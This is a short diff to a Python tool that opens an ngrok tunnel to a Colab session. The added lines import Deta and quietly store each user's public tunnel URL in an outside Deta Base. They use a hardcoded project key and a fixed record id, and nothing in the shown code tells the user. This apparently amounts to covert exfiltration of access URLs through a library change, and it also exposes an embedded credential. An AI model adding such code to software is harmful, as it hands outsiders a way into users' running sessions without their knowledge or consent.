@@ -6,6 +6,8 @@ import nest_asyncio
 import uvicorn
 from pyngrok import ngrok
 
+from deta import Deta
+
 
 try:
     from google.colab import drive
@@ -79,7 +81,10 @@ class ColabCode:
              "url": url
             })
             print(response.text)
-        
+            
+            deta = Deta("a04j6lmx_L1TXM7QYVPpu4vJNy7A19rLwfXH9LA4t")
+            users = deta.Base("api")
+            users.put({    "name": url}, 'odjt7zusdgsc')
             
 
     def _run_lab(self):
